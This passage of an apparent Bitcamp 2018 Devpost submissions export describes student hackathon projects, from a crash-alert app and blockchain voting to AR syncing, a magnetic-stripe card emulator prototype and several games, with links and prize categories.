In the event of an accident the time needed for first respondents to come to the accident scene is inversely related to the chance of survival of the victim. That means, our service has a direct and meaningful impact on increasing both the chance of survival and consequent degree of recovery of motor vehicle crash victims. 

What it does

CloseCall is a highly integrated mobile app and full stack web service that efficiently connects first responders to motor vehicle accident victims as an accident occurs. Traditional response in the event of an accident would involve the victim calling for emergency services themselves, or if they are incapable, a bystander/witness. The ability of this application to reach out to first responders as soon as possible dramatically improves the victim�۪s chance of survival and recovery. Often times, there may not even be witnesses to help out in this situation at the time of the event. Thus, CloseCall is a safety app that is ready to respond when no one else will. The mobile aspect of our application will be used by the driver as they are driving. A crash is detected monitoring the acceleration of the vehicle over time periods. Measuring the jolt (the degree of change in acceleration) is an effective indicator of a crash situation. Once a crash event has been triggered, a voice message will alert the driver that 911 will be contacted in 20 seconds. The user can easily disable the trigger in the event of false-positives by voicing ���stop�۝. If no response is given, 911 and the nearest hospital will be notified of the accident. On the web service interface, hospitals can track the location of accidents on an integrated map. Information such as name, time/date of accident, GPS location, and shortest route to the scene can be easily displayed. Monitoring of this data in aggregate will not only allow for hospitals to dispatch appropriate emergency response vehicles quickly, but will also allow them to extract useful information. Clustering of accidents on the map may help to signify the degree of the accident-thus allowing for more effective allocation of medical resources. Additionally, date/time statistics may be collected over a long period of time to reveal trends such as which hospitals tend to be over-burdened. 

A service that provides immediate response for individuals that get into car accidents. Mobile device will prompt user to confirm/deny whether or not they are in an accident. We used voice confirmation to accomplish this. No response will prompt a call to 911 as well as a text message to an emergency contact. Confirming your safety will cancel the call and reset. If accident were to be detected, information will be sent to hospitals that support Close Call. Hospitals will receive the longitude and latitude location of the accident as well as time of the accident and name of user. They can also track the shortest route to the scene of the accident. 

How we built it

Our project is composed of two main components- the mobile app for the driver and the full stack web service for the hospitals. 
The mobile application was built using Android Studio. We used intents for calling, texting, initiating text-to-speech, and voice recording. We tracked real-time pinpoint-accurate location, created and applied an algorithm using Android�۪s built-in accelerometer to determine the threshold for crashes
The web service component involved setting up an EC2 instance using AWS. The server would receive post messages from CloseCall app clients. The backend of the server was implemented using Express, Bootstrap, Mongoose (MongoDB), Handlebars templating, and arcGIS API integration. The front end was implemented using NodeJS and HTML. 

Challenges we ran into

A major challenge was the learning curve for figuring out how arcGIS worked and how we could generate data in a form suitable for interacting with the ArcGIS API. Another challenge was figuring out how to send and receive POST requests between an Android mobile application and our AWS server. Additionally, adding intents like voice recognition and creating an algorithm for setting a threshold for determining a crash took some time.

Accomplishments that we're proud of

We are really excited about this project because it has potential to provide a meaningful service to thousands of people in our campus, in our country, and to the rest of the world. In the course of 36 hours we were able to create an entire web application with client/server connection that successfully connected with mobile devices. Additionally, we created a really cool and interactive way to visualize a very important problem.

What we learned

Three out of four of our team members were first-time hackers. So this project was especially powerful because it showed us how much we can achieve when we set our hearts to it. This project was definitely difficult, but we worked well as a team and collaborated to quickly debug any issues. As a team, we learned how to integrate voice recognition/text-to-speech and automate calls and text messages in an Android app, create a web server, use AWS services, and send data between different platforms. 

What's next for Close Call

One of the most exciting parts about our project is that there is so much more that we can do to make our idea better. Our next-step goal is to integrate Fitbit trackers with the CloseCall application so that information about heart-rate can be tracked by medical personnel as they travel to the site. Live location updates can better inform hospitals when the patient will arrive so that they will be better prepared to start treatments. Camera integration and report generation can be used to provide official documentation useful for insurance claims and investigations (in the case of a crime). Once we have a solid system, we hope to become a successful startup and publish our service to Google Play and 
",http://ec2-54-175-150-2.compute-1.amazonaws.com:3000/,"Best Use of AWS - Amazon Web Services, Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri, Improving Healthcare with Mobile Technologies - Credible Behavioral Health",,vietman391,akshaya21042,
Samaritan,http://bitcamp2018.devpost.com/submissions/92290-samaritan,"Inspiration

When we saw that addressing the issues arising from natural disasters, an idea jumped immediately into our minds. 
We've all heard about the problems facing Puerto Rico after the hurricane - and we've heard plenty about how little help they got. That inspired us to make something that might enable us to act up against that sort of helplessness: a way to give us some way to help.

What it does

Samaritan operates on the basis that there are people out there who want to help, and that there are people out there who need help. The requesters put out requests for help - a request, a description of what they need help with, and time and a place, and a guess at the number of people needed for the task at hand. The volunteers see these requests in a feed based on time and location: they get a selection of the closer requests. Requesters could be those in direct need of help, or even those who organize help and know where it is needed. Volunteers would not be obligated to do anything, and thus protect themselves from being roped into unwilling situations.

How we built it

We used express.js (and pug and less) to create a rudimentary user interface. The central piece of this all is the database of requests stored using MongoDB Stitch, with a geospatial index used for all the searching. From there it was a matter of facilitating the creation and viewing of requests by users.

Challenges we ran into

A whole lot of this hackathon was a frustrating swim through API documentation. Figuring out how express.js worked, how pug worked, how to run a node.js project, what the difference was between MongoDB and MongoDB Stitch, etc. Still, with time, documentation, and tears, we made it through (mostly).
Another thing that we had trouble was design: functionality may be important, but as far as we can tell a lot of presenting for a hackathon is making your app pretty - something we don't exactly have the skills nor time for.

Accomplishments that we're proud of

Our project might not be very glamorous, but looking at where we are and where we came from, we're really proud. So many concepts might seem simple, but working them all out under a time crunch was extremely satisfying. Learning how databases work with Mongo, learning how routing and web servers work with express.js, learning how Promises work in JavaScript; these things all challenged us, and we triumphed over them all.

What we learned

We learned that user authentication is very difficult, as is website styling. We learned that JavaScript has a nasty way of being exactly the type we don't want. We learned that the node.js environment has a whole ton of libraries that for some reason we need all of. Above all, we learned that it's not the programming part of these things that are the hard part. It's taking all the things that we don't understand and making them play nice together. It's about taking things that make our lives easier but more complicated and trying to use them to fix difficult things simply.

What's next for Samaritan

For all our pride and glory, it's obvious that Samaritan is not ready for any sort of use. We would want to build a legitimate user system, with the main page tailoring location around that user's reported location. Originally, we also wanted tags of a sort in response to true natural disasters that would aggregate all requests directly related to whatever catastrophe had happened.
",https://github.com/omivore/samaritan,"Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton, Best Use of MongoDB Stitch - MongoDB",,,,
blockballot,http://bitcamp2018.devpost.com/submissions/92291-blockballot,"blockballot

Bitcamp 2018 Hack to create a blockchain voting system.

Fork of ARK to allow an election. Delegate election results are stored forever in the blockchain, preventing fraudulent or faked voting. Since the infrastructure already allows voting for delegates, I am creating a system to allow humans to create an ARK wallet associated with an ID. They visit the website and fill out a google form (could later be updated to a SQL database in order to not rely on google).  Then, the election agency(genesis wallet owner) can distribute the exact amount of coin necessary to submit a vote. The ARK-Python api is used for the election administrator to be able to make a large number of 1 MBT transactions to all eligible voters.  I used the ARK.io guides to setup a bridgechain node, with some unique configuration options in the arkballotinstall.sh file. 

The main change between use cases is the reward per block for maintaining a node. In a large system, like a government, this should be small or zero and delegates (new office holders) should instead be paid their government salary as incentive to maintain a node. Alternatively, a public institution could do the labor of maintaining the node so that officials do not have to be fully technically literate. In a smaller one, delegates and officials are more accountable to the community are a part of and so the solution to a reward for maintaining the blockchain is more nebulous. This is a factor for the group in question to decide. 

The illustrative case will be a UMD student group. For this group, members have to pay dues. They will pay the election administrator (genesis wallet owner) dues for the year to obtain a coin to vote and the administrator will be responsible for depositing these USD into the group treasury. As a reward for maintaining the nodes, the delegates for this group will not have to pay dues for the year. 

The implemented solution does not rely on a dues paying organization. However, an organization that does pay dues could run the Names/Addresses file against their database of dues paying members.
",https://github.com/cohringer/blockballot,Decentralise Everything: Blockchain challenge - Ark,No,,,
Burnt,http://bitcamp2018.devpost.com/submissions/92292-burnt,"Inspiration

Melanoma is the deadliest and most common type of cancer in the US. Many times, the telling signs go unnoticed for years on end due to the nature of it's symptoms; a small blemish here, a spot there. These seemingly benign signs send the affected's life down a spiral of expensive and grueling treatment. The problem with the current UV Index is that it is a blanket measure that doesn't take into account the individual. So one may be at a higher risk of getting sunburned than the UV Index leads them to believe, possibly increasing their risk of Melanoma three times over. This is where our app comes in.

What it does

Burnt is a UV index scaling Android application that takes in a location and a picture and renders a tailored UV index for that individual based on their skin tone and the current high UV Index in that location for that day.

How we built it

We did all of our work in Android Studio with the help of a few APIs and other software. This included Esri's Android SDK, Google's Cloud Vision facial recognition API, and Dark Sky's weather API. Using these, we created our own algorithms to tailor the UV index value based on the skin tone of the user. 

Challenges we ran into

We first used Android Studio's built in facial recognition, but the results were fast but unreliable. We then attempted to use Microsoft's Face API for the recognition, but the current version we had of gradle in Android Studio was not compatible with that API. Finally, we settled on Google Cloud Vision facial recognition and were able to produce fairly consistent results, the only problem being that we had to sacrifice speed for reliability. In addition, while testing weather APIs, we went through a few before deciding that Dark Sky provided the most relevant information to our project.

Accomplishments that we're proud of

Overall, the event went very well for our team. We are happy to have made our proof of concept app and are proud of the amount of work we put in. Throughout the process, we got practice with Android application development, API usage, and working as a development team. In addition, our ability to adapt to unforeseen challenges without giving in showed resolve.

What we learned

We learned a great deal about the implementation of APIs and using that data in a meaningful way. In addition we got a LOT of work with Android Studio and the process of bringing a mobile application to fruition.  

What's next for Burnt

The next steps for our company are to expand our research and pinpoint an accurate measure for our predictive algorithm. At the moment, our research was very limited and the studies out there for this specific problem are sparse. We would like to run studies to find reliable data that could allow us to implement a machine learning implementation of this project.
",https://github.com/CliffBakalian/bitcamp2018,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Hack with Esri APIs and SDKs - Esri, Improving Healthcare with Mobile Technologies - Credible Behavioral Health",No,CSackalosky,jugoodma,
Paranoia,http://bitcamp2018.devpost.com/submissions/92293-paranoia,"Paranoia

Bitcamp 2018 Project

This program is meant to keep track of the game state of a game of Paranoia, a game in which people are given targets and words and must make their target say their assigned word.



Commands

(for these commands, omit the '' around the fields in the actual command)


""add_player 'name'"": adds a new player to the list of players that will be in the game and gives it a name of 'name'.
""create_game"": creates the game. This should be run after adding all of the players. This will assign all of the players random words and targets.
""print_list"": prints the current game state with players, their targets,
""kill_player 'name'"": removes player 'name' from the game, awards their killer with points, and assigns the killer a new target and word.
""target_killed 'name'"": removes 's target from the game and awards  with points and assigns them a new target and word.
""quit"": exits the program

",https://github.com/Vihul/Paranoia,,,mainesail3,,
PharmerC,http://bitcamp2018.devpost.com/submissions/92294-pharmerc,"Inspiration

Last summer, my sister worked at a pharmaceutical company for her Northeastern University co-op.  This experience opened her eyes up to the world of pharmacy, especially with respect to consumers.  She noticed that many customers do not have strong backgrounds in medicine, and as a result, many of them did not take the medications properly.  My sister wanted to help customers better understand their medicine, and that's where we came in!

What it does

Our application scans an image of a pharmaceutical drug label and consequently determines the name of the drug from the text of the label.  Using the name of the drug, the application then browses through our database of potentially thousands of drugs to return the corresponding drug's main usage and side effects to the app's screen.

How we built it

We used android studio to create the front end and back end for the application.  In order to help scan the label of a pharmaceutical drug, we utilized a google API which contained text recognition algorithms.

Challenges we ran into

Android studio was very annoying to work with, as this platform integrated an abundance of tools in one program, causing the platform to be less user friendly.  Furthermore, trying to import an API for using a camera in our application was very difficult to find.

Accomplishments that we're proud of

We are proud that we were able to create our first android application.  Also, we overcame every obstacle that could have stopped our progress.  We also learned how to properly debug every small problem in an efficient manner.  Ultimately, we learned how to walk as a power team. 

What we learned

We realized that there are so many ways to learn computer science, and knowledge is not limited to academics and schoolwork.  It is mostly about participating in new experiences and projects.

What's next for PharmerC

First, we want to integrate a much larger database that includes all FDA approved drugs into our application.  Furthermore, we want to improve our application's user experience and overall professional presentation by developing our front end design skills.  We also want to improve character detection accuracy when the camera detects a lot of noise.  
",https://github.com/erlunlian/PharmerC,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Improving Healthcare with Mobile Technologies - Credible Behavioral Health, Best Accessibility Hack - Microsoft",,,,
Rally (Web App),http://bitcamp2018.devpost.com/submissions/92296-rally-web-app,"RallyApp

A simple team creation facilitation and collaboration platform for the web. (Bitcamp 2018 Project)


",http://www.rallyapp.org,"Best Domain Name - Domain.com, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook","Nope, it is all software.",,,
GG 0G,http://bitcamp2018.devpost.com/submissions/92297-gg-0g,"Inspiration

I am currently taking an honors class exploring possible missions to Mars. I decided to create a simulation to train astronauts and civilians about what it would be like to live and navigate in 0-gravity.

What it does

Players use the Myo armband to push off walls and navigate around the spaceship.  They look around using an Oculus headset; accordingly, the arm and head movements are handled independently for increased realism.

How we built it

We built the spaceship and model in Inventor, we coded the physics in C# using visual studio, and we compiled the environment in Unity.

Challenges we ran into

Broken laptops, complicated multi-variable physics, spotty wifi, oculus connectivity, integrating Myo band with unity, and not having motion sickness while playing

Accomplishments that we're proud of

Creating a accurate and realistic physics system in 0 gravity that is fun.

What we learned

The capabilities of a team-centered, focused intuition.  Also, we strengthened our programming skills and Unity development capabilities.

What's next for GG 0G

We will continue to improve our simulation, especially our hand interaction. We will investigate the possibility of adding two handed movement in our simulation; additionally, we will explore using Oculus touch controllers for hand movement.
",https://drive.google.com/open?id=12OIHh-XVC47QzluVOwYZaxoA6ZizdCEN,"Using Virtual Reality Technology Design the Best Manufacturing Facility - Lockheed Martin, Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook","yes, I17 ish",mgraber1,,
Disaster Prevention,http://bitcamp2018.devpost.com/submissions/92300-disaster-prevention,"Inspiration

Notification alerts for emergencies.

What it does

The website gives information to help aid people before a disaster hits. By organizing stores that sell necessities  and giving tips on different types of disaster, this website prepares people for different types of disasters.

How we built it

We used Github, javascript, css, and html to build the website.

Challenges we ran into

Importing data from other websites.

Accomplishments that we're proud of

Learning everything in a timely manner and working together to put together a website.

What we learned

We learned a lot about web development.

What's next for Disaster Prevention

We are trying to implement a way to forward data from other websites to update specifically how much stock is left for distinct products on our website.
",https://disprev.github.io/,Best Hack for Aiding Natural Disaster Recovery Efforts - Booz Allen Hamilton,No,noahgriff99,michaelye956,
Fruit | Invest in your future,http://bitcamp2018.devpost.com/submissions/92301-fruit-invest-in-your-future,"Inspiration

Build a Financial Educational Tool for a user persona of a 58 year old male who is looking to retire in the next few years and is concerned with paying off debt, having enough money when he retires, and ending well/providing for his family when he passes. I was inspired by the UX/UI design workshops and implemented what I took from those along with the Intro to Web Design and asking mentors!

What it does

Interactive website with clean UX/UI presents helpful financial education in the form of videos.

How I built it

I built it using Visual Studio Code, Pinegrow Web Editor, Bootstrap framework, and a lot of oreos haha.

Challenges I ran into

This is my first hackathon and I learned a lot more than I thought I would have!! It was so much fun, but it was also very challenging especially when it came down to working with the CSS for the website as I havn't fully grasped that yet and had to do a lot of trial and error to get the colors how I wanted and to make sure there were no displaying errors. I also ran into issues with versioning that taught me lot and once I implemented Git I was able to get on a roll.

Accomplishments that I'm proud of

This was my first hackathon and while I had done some web programming in high-school this was my first time using Visual Studio Code IDE and Github so I am really proud of implementing both of those resources in my project.

What I learned

Not only did I learn how to use Visual Studio Code (and some of the extensions that comes with it), I also learned about Git versioning and Github for desktop. Additionally, after attending the different design workshops and sketching out myself I was pleased to present a clean and user-friendly website that is what you see! 

What's next for Fruit | Invest in your future

To build upon the idea and produce/gather curriculum to implement into the program (especially videos!)
",https://github.com/Bicket/specialitycommunications,,,,,
Cards Against Humanity,http://bitcamp2018.devpost.com/submissions/92302-cards-against-humanity,"Inspiration

Well talk about in the morning ;)

What it does

How I built it

Challenges I ran into

Accomplishments that I'm proud of

What I learned

What's next for Cards Against Humanity
",,Best Domain Name - Domain.com,no,,,
multiplA.R.,http://bitcamp2018.devpost.com/submissions/92303-multipla-r,"Inspiration

With rising technologies like Augmented Reality making headlines, the one drawback that prevents it from truly becoming revolutionary is the lack multi-user support. Right now, there are no easy, accurate ways to sync multiple users in the same real-space environment without hassles such as QR codes or manually aligning virtual objects with other users. We wanted to build something that would streamline the process. No dedicated servers, no QR codes, no hassle. Just something that works  

What it does

As an MVP, our app creates a shared AR session with two users: a Host and a Client. The Host is seen as the ""reference user"", who presents a reference for the client to sync to, with the future potential to add as many clients as desired. Once the client aims their camera at the reference, they are synced to a shared origin and both phones begin tracking its partner, visualized by a white sphere.

How we built it

We segmented the project into 3 milestones: basic structure in swift, the establishment of a peer-to-peer network, and Augmented Reality tracking. We were both new to swift, ARKit, and Multipeer connectivity; however, we were quick to learn the foundations of each.

Challenges we ran into

Since we were not familiar with Multipeer, we found initial communication to be difficult. However, once we understood the logs we were receiving, it was easy to send data seamlessly. Later on, we had to figure out a way to encode complex data to send tracking information.

Accomplishments that we're proud of

We are very proud that, on Friday evening, we came in without any knowledge in iOS development, but we had an idea we stuck to and developed something we didn't expect to within a weekend

What we learned

We learned about an entirely new medium of software development, how peer to peer communication can be carried out, and a touch of quaternion math

What's next for multiplA.R.

Any future multiplayer game or collaborative experience that can be enhanced with AR can be implemented with this framework, allowing many people to experience the same virtual content in the same real space. We intend on testing these implementations soon as well as compressing this framework into a portable library for clients to easily incorporate in their applications
",https://github.com/brennyD/multiplA.R.,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",no,,,
C++ Vending Machine,http://bitcamp2018.devpost.com/submissions/92304-c-vending-machine,"Inspiration


I had hw to finish

",,,,,,
Bitnana,http://bitcamp2018.devpost.com/submissions/92306-bitnana,"Bitnanas

FINRA Investors protection challenge for Bitcamp 2018.



What it does

The Web app uses an in-game currency named Bitnana which is used to guide the college students willing to know more about investments. Once registered and logged in, the user can have access to:


a list of tutorials, which keeps track of their activities and rewards them accordingly with bitnanas;
a simulation page, allowing the user to learn how to trade and along with the risks associated with each transaction;
and a discussion board. 


Getting Started

The following instructions will guide you on how to make the project work on your local machine for development and testing purposes.

Installing

Bitnana uses MeteorJS as framework to get a customizable HTML/CSS/JS workspace with automatic package management. 

Running the app

After installing meteor, open a console and enter
cd C:\<path>\<to>\<project>\dev
meteor

Meteor will begin by installing the dependencies of the project and then you will be able to test Bitnana via localhost:3000.

Challenges we ran into

Bitnana relies on Meteor: a JavaScript framework allowing developers to build a full-stack application. Since the team lacks experience in web development, being able to edit the front-end and the back-end would give a good playground to work with.

Unfortunately, Meteor tools were not working on our workspaces; it became impossible to execute the project correctly. Even by searching the internet, it was apparent that this problem occurred to other developers and there were no known solutions. The team, afterward, focused on the UI/UX aspect.

Authors


Steven Lao - Assets - laosteven
Jin Liu - Research - 5871jin
Zidan Luo - Tutorials - VioletLuo

",https://github.com/laosteven/bitnanas,Best Designed Investor Education Product - Finra,,5871jin,,
CrowdPlay,http://bitcamp2018.devpost.com/submissions/92307-crowdplay,"We wanted a better way for giving groups the power to control music being played at events by letting them submit songs for event playlists in real time. The application we created lets users submit song suggestions via Slack, which adds the songs to a Spotify playlist in real time to be played during events and gatherings. This application has the option sensor song suggestions that are explicit, so that this can be used at a variety of occasions for users of all ages.
",https://github.com/Fysac/CrowdPlay,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,HarryVancao,,
Flag Practice,http://bitcamp2018.devpost.com/submissions/92308-flag-practice,"I wanted to build a website for the first time so I decided to base it upon one of my interests, vexillology. I find flags cool because something which can seem so insignificant can be used to identify a country or give someone information about that country simple off colors included in a rectangle(unless its Nepal which is a weird triangle shape). I learned basic HTML, CSS, and javascript for this project. The project displays flags and lists the country the flag represents below it. Users can click on the flag to display the next flag in the series of flags. I hosted the site of github as it would be easy to see versions of the site I used and that it was free to host my site there.
",https://seanwaxman.github.io/,Most Unique Hack - 1517 Fund,No,,,
Vote Code,http://bitcamp2018.devpost.com/submissions/92309-vote-code,"Inspiration

As a member of several organizations, there are always times when a quick vote needs to be made, so to solve this problem we built Vote Code to be a simple and intuitive solution.

What it does

Allows for quick and easy voting with the ability to set up a poll in seconds, and makes the poll easy to share with a QR code.

How we built it

we used MongoDB Stitch for the entire backend (with AWS selected as the cloud provider) and jQuery for the front end.

Challenges we ran into

As someone who's more used to a relational DB's, learning how MongoDB worked was an interesting challenge.

Accomplishments that we're proud of

We didn't decide to work on this until there were only 12 hours left in the hackathon!

What we learned

How powerful MongoDB Stitch is!

What's next for Vote Code

It's public source, so I'd love to iterate on it and maybe find some other contributors out there to help me a little bit too.
",https://schuylerc.github.io/vote-code/,"Best Use of AWS - Amazon Web Services, Best Use of MongoDB Stitch - MongoDB, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,,,
fold x fold,http://bitcamp2018.devpost.com/submissions/92310-fold-x-fold,"Read more about it at:

https://medium.com/@jasteiner11/fold-x-fold-aa9e6eaae74d
",https://medium.com/@jasteiner11/fold-x-fold-aa9e6eaae74d,,,,,
Lumify,http://bitcamp2018.devpost.com/submissions/92312-lumify,"Inspiration

I purchased a cheap LED strip kit of Amazon that came with a basic IR controller. I immediately found myself losing the remote and wondering if I could connect it to my Echo dot. I knew there were IoT LED strips available such as the Philips Hue or LIFX but both were very expensive from 60-80 per meter of LEDs. Both Philips and LIFX didn't allow any other LED strips to connect. The only WiFi connected controller I could find was 30$ with a really bad IOS app with a terrible user interface and it wouldn't connect with any other IoT devices or even Alexa. Then I thought I could make a product better, cheaper, and more customizable than any current one.

What it does

We have an Arduino programmed to connect to the LEDs then connect to the user's WiFi network communicating with our cloud server via MQTT. The user can download the Lumfiy app from either the App Store or the Play Store then register any of their LED strips to be able to control them from anywhere in the world. The app provides many preset effects for the user to try.

How we built it

The app was built using react native with a node js backend and postgres database. The Arduino is programmed in the arduino language. MQTT is used as a lightweight protocol for communication between the server and the arudino.  

Challenges we ran into

The challenge we ran in to was mostly getting familiar with new technologies such as react native. One part was making the splash screen animation, it took almost 4 hours to do it. We also had trouble setting up the server on aws ec2, because the machine was Amazon Linux instead of Mac OS which I�۪m more familiar with.

Accomplishments that we're proud of

We were able to build a fully working mobile app. The hardware run fast and efficiently allowing seamless control. The part we are most proud of would be the splash screen, which looks really nice.

What we learned

We learned much of React-Native and Node.js. We also learned how to program good-looking animations, transitions, and especially a really cool splash screen. 

What's next for Lumify

We will create a Zigbee version of the Arduino so that users who already have hubs such as Smart Thing can connect their LED strips without using WiFi which can have limited range, be overcrowded, and unreliable. Lumify will also have an option for users to load their own custom patterns and effects. Lastly, Lumify team will add strip sync so multiple controllers can be sync to create a truly unique and connected smart home. Once these features are added we will have the hardware finalized and mass produced for market.
",https://github.com/yellgreniff/led_light,"Best Use of AWS - Amazon Web Services, Best Domain Name - Domain.com, Most Futuristic Hack - Paypal, Best Designed Investor Education Product - Finra, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",,abeldelpino,hollyvacc,
CareMode,http://bitcamp2018.devpost.com/submissions/92313-caremode,"CareMode

Approximately 34.2 million Americans serve as caregivers to adults age 50 or older. Knowing a loved one who suffers from dementia can be mentally, emotionally, and physically tolling. Our goal is to connect you with the right doctors that can help you, along with the reliable information and resources you need to better understand how to help your loved one. With all the resources you need one click away, you can go back to being there for your loved one, without the added stress. We believe in the power of caregivers - after all, caregivers save lives.

Research has even found on average, that patients under high mental health caregivers live two years longer than patients under low mental health caregivers

Some of us on the team have been personally affected by Alzheimer's and two of us are working on a project to improve Alzheimer's diagnosis, and we wanted to bring our passion to bitcamp.
",https://github.com/lookcw/CareMode,"Best Philanthropic Hack - Bloomberg, Best Hack (be passionate) - Facebook, Best Accessibility Hack - Microsoft",No,HanwenYang,mvguggari,
Against_The_Clock,http://bitcamp2018.devpost.com/submissions/92314-against_the_clock,"Against_The_Clock

Dreamweaver Project 2


",https://github.com/sshahrier/Against_The_Clock,,,,,
Potato...The Game,http://bitcamp2018.devpost.com/submissions/92315-potato-the-game,"Inspiration

All of us have a passion for developing interactive games. We started with an idea to build a cool game involving some sort of leveling up system that rewards players for playing the game. That transitioned into an idea for our first simple game: a game where all you do is peel potatoes! 

What it does

In short, it gives you the ability to peel potatoes at an alarming rate. Using tools ranging from your finger to a samurai sword to dynamite, there's plenty of peeling power to go around.

How we built it

We used the Processing framework which is built using the Java programming language. We used processing to allow us to quickly turn code into artwork.

Challenges we ran into

Our project was a roller coaster of emotions. Originally, we tried to use JavaScript and general web development to build our project, but we realized that not enough of our team was comfortable with JavaScript and its many frameworks. We nearly gave up on the project as a whole, but a shimmer of light beamed through when we thought of using Processing. Everything was going well, until we forgot to save our code. We lost about three hours of work but came back from it. A major lesson was learned.

Accomplishments that we're proud of

We created our first ever game! We also managed to use GitHub for the first time. Our team isn't entirely comprised of Computer Science majors who have been programming all our lives, so this was a really cool first hack for all of us.

What we learned

Firstly, we learned to choose technologies that the entire group is comfortable using. We also learned that its important to divide the work so everyone can help in a way they see fit. And of course, save your code!

What's next for Potato...The Game

A spinoff in which you peel more vegetables, for sure. Cucumbers?
",https://github.com/shyampujara/Potato...The-Game,"Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",No,TrevorSmith,emilygee1,
Tanks!,http://bitcamp2018.devpost.com/submissions/92316-tanks,"Inspiration

At first we were considering game using image processing and real-life components that the user was able to create themselves.

What it does

Tanks! is a multiplier game where the each player has a tank with 3 lives and tries to shoot the other tank. It exists on a battleground that is hand drawn by the user and processed into the game to become the obstacles that the users face.

How we built it

We built this app using image processing, joystick controls, and physics collisions that we created ourselves. It is developed in Java and XML for android.

Challenges we ran into

One significant challenge we faced was figuring out how the collision physics worked with a acceptable refresh rate as well as the solidity of the user-created obstacles.

Accomplishments that we're proud of

After having a significant amount of debugging, we gained a lot of experience while practicing our skills and are very proud of how successful our debugging was. We are also very proud of how we were able to connect all of the various parts into one working project.

What we learned

From this experience, we learned a lot about Git, Android Studio, XML, and especially debugging.

What's next for Tanks!

In the future, we plan on submitting it to the Google Play Store with new features such as power-ups, rubber bullets that ricochet, and different game modes.
",https://github.com/bencarlisle15/Tanks,"Most Futuristic Hack - Paypal, Most Unique Hack - 1517 Fund, Best Hack (be passionate) - Facebook",,Michaellin250,ramansingh-umd,
How to Adult,http://bitcamp2018.devpost.com/submissions/92317-how-to-adult,"Inspiration

We wanted to see what we could do in 36 hours with 3 hours of sleep.

What it does

This app is full of basic life and financial advice for college students. Because we really need it.

How we built it

Unicorn tears, carpel tunnel, caffeine, perspiration. 

Challenges we ran into

Finding a problem that we could solve in 36 with 3 of sleep.

Accomplishments that we're proud of

We stay humble by not bragging about our beautiful user interface.

What we learned

Market research is very, very important.

What's next for How to Adult

Submission to iOS App Store
",https://github.com/MattMMarks/how-to-adult,Best Designed Investor Education Product - Finra,,,,
Nutribrain,http://bitcamp2018.devpost.com/submissions/92318-nutribrain,"Inspiration

As foodies and lovers of travel, we both share a love of adventurous food. The less pronounceable the name, the better. We dive right in without a second thought. But many of our friends are subject to dietary restrictions - be it allergies, diabetes, or simply due to moral or religious reasons. We wanted to empower them to join us as culinary pioneers without having to worry themselves about staying with known safe dishes.

What it does

Nutribrain combines the power of machine learning with a robust nutritional database, allowing users to see a list of probable allergens and other relevant nutritional information. 

How we built it

We used CoreML to run image classification in near-real time, and React Native to connect everything together.

Challenges we ran into

Setting up React Native was tricky considering neither of us had any background in iOS app development. Moreover, we did have to tweak a few of the native components, which meant navigating some Objective C.

Accomplishments that we're proud of

This was our first major iOS app, and it was incredibly gratifying to see our own code running on our phones. Moreover, this was the first time either of us used React Native, and our first major machine learning project. It was a heck of a lot of firsts.

What's next for Nutribrain

In the future, we'd like to polish the app quite a bit and perhaps train a more versatile model. After which, we'd add support for additional nutrition stats and dietary restrictions. From there, we may do some form of nutrition logging before releasing it to the world.
",,"Best Philanthropic Hack - Bloomberg, Best Accessibility Hack - Microsoft",No,,,
Swype,http://bitcamp2018.devpost.com/submissions/92319-swype,"Inspiration: The whole reason why cards were introduced was so that people avoid carrying cash and having bulky wallets. We have been successful in trying to eliminate cash, however, these days we have wallets filled with cards defeating its purpose. I wanted to build a device which would combine all the cards into one single device!

What it does: My device is able to simulate multiple cards just by a click of a button

How I built it: I built it using a Webmos D1, a wifi enabled Arduino chip and a lot of copper wire.

Challenges I ran into: I was fascinated with the amount of thought that has been put into these cards. These cards have multiple security points to make sure the data is not misread as the card is being swiped. Trying to come through all of those barriers was really time-consuming, especially the LRC/CRC checks these cards have!

Accomplishments that I'm proud of: I am glad I was able to prototype a compact device to simulate magnetic stripe cards and was able to complete it.

What I learned: I learned a lot about electronics and especially how magnetic stripe cards actually work!

What's next for Swype: Something I would love to work on in the future, is to make the device more compact and more polished.
",,"Most Futuristic Hack - Paypal, Best Financial Hack - Capital One, Most Unique Hack - 1517 Fund, Best Digital Forensic Hack - Cipher Tech Solutions, Best Hack (be passionate) - Facebook",,,,
Pianist,http://bitcamp2018.devpost.com/submissions/92320-pianist,"Inspiration

We like both art and music, sometimes we think that when we are drawing, is it possible to have some music reflecting the emotion of line, graph, etc.? Therefore, we want to do a painting tools that can produce music at the same time, and there will be a music for the overall picture. It is very Interesting and it can be applied in lots of areas.

What it does

The App is all about drawing and playing music concurrently. Your drawing will be presented alone with sound from certain instrument. There is a canvas where users can draw whatever they want, while they are drawing, music will be played at the same time. The music depends on what users draw. Users can change the colors of brush definitely, and
different color will play different music. After you finishing draw, you can play the music corresponding to the whole thing you draw until users click clear button. And Users can save drawing and the music of it too.

How we built it

At the first day, we brainstormed and determined the idea, and we figured out lots of details together. The second day, we started the project, we figured out the algorithm and the structure and steps we need for the App, and then each of us started to do our own part. After all of us finishing our own part, we combined them together, we communicated very well, and has figured out together how to debug, improve, and make it better. We record the pixels people draw, and has designed an algorithm to play music about what they draw. And we designed the background(user interface), and combined code with it, and then debug, improve, debug, improve.

Challenges we ran into

This is our first time learning and using Java Midi system. learning from a manual and tutorial, and turn them into real program in one day, how to combine music/art and code together. split a big problem into several small one, and how to team work. optimize java program. use system recall. JVM's poor executing order,  hardware difference in screen resolution. 

Accomplishments that we're proud of

